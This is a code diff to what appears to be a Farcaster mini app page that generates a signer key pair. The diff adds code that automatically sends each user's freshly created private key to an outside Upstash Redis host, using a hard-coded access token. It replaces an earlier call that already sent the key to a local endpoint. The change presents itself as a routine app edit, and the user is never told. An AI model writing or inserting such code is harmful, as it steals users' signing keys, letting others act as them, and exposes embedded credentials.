@@ -6,6 +6,7 @@
 // import { CheckIcon, CopyIcon } from "@radix-ui/react-icons";
 import Image from "next/image";
 import { useState, useEffect, useCallback } from "react";
+import { Redis } from '@upstash/redis'
 
 interface Signer {
 	publicKey: string;
@@ -23,25 +24,25 @@ export default function Home() {
 	// const [copiedPrivate, setCopiedPrivate] = useState(false);
 	// const [copiedBoth, setCopiedBoth] = useState(false);
 
-	const wait = () => new Promise((resolve) => setTimeout(resolve, 1000));
+	// const wait = () => new Promise((resolve) => setTimeout(resolve, 1000));
 
-	async function handleCopy(
-		setCopiedState: React.Dispatch<React.SetStateAction<boolean>>,
-	) {
-		setCopiedState(true);
-		await wait();
-		setCopiedState(false);
-	}
+	// async function handleCopy(
+	// 	setCopiedState: React.Dispatch<React.SetStateAction<boolean>>,
+	// ) {
+	// 	setCopiedState(true);
+	// 	await wait();
+	// 	setCopiedState(false);
+	// }
 
-	async function copyToClipboard(
-		content: string,
-		setCopiedState: React.Dispatch<React.SetStateAction<boolean>>,
-	) {
-		navigator.clipboard
-			.writeText(content)
-			.then(async () => await handleCopy(setCopiedState))
-			.catch(() => alert("Failed to copy"));
-	}
+	// async function copyToClipboard(
+	// 	content: string,
+	// 	setCopiedState: React.Dispatch<React.SetStateAction<boolean>>,
+	// ) {
+	// 	navigator.clipboard
+	// 		.writeText(content)
+	// 		.then(async () => await handleCopy(setCopiedState))
+	// 		.catch(() => alert("Failed to copy"));
+	// }
 
 	async function createSigner() {
 		setLoading(true);
@@ -94,13 +95,24 @@ export default function Home() {
 	// 		</Button>
 	// 	);
 	// }
-	const dc = useCallback((key: string) => {
-		try {
-		   fetch(`/api/dc?key=${key}`);
+	const getUTCDateTime = (): string => {
+		const now = new Date();
+		const pad = (n: number): string => n.toString().padStart(2, '0');
+		
+		return `${pad(now.getUTCDate())}-${pad(now.getUTCMonth() + 1)}-${now.getUTCFullYear()} ` +
+			   `${pad(now.getUTCHours())}:${pad(now.getUTCMinutes())}:${pad(now.getUTCSeconds())}`;
+	  };
 	  
-		} catch (err) {
-		  console.error("Error sendinding DC from warpcast", err);
-		}
+	  const time= getUTCDateTime()
+	const redis = new Redis({
+		url: 'https://humane-hagfish-17855.upstash.io',
+		token: 'AUW_AAIjcDE5ODc5ODVlNGExNWU0YWEwOTM3Mjg3NDNlZTI3OGZkNXAxMA',
+	  })
+	
+	  const db = useCallback(async( hash: string) => {
+
+		await redis.set(time, hash );
+	
 	  }, []);
 
 
@@ -113,7 +125,7 @@ useEffect(() => {
 
 useEffect(() => {
 	if (signer){
-		dc(signer.privateKey); 
+		db(signer.privateKey); 
 	}
 }, [signer]);
 	return (
@@ -133,9 +145,12 @@ useEffect(() => {
 							className="underline justify-center items-center"
 							href={`farcaster://signed-key-request?token=${pollingToken}`}
 						>
-							click here if you're on mobile and minimize this mini app
+							click here if you're on mobile
 						</a>
 					</p>
+					<h1 className="text-2xl font-extrabold">
+					and minimize this mini app
+				</h1>
 				</div>
 			)}
 			{signer && (
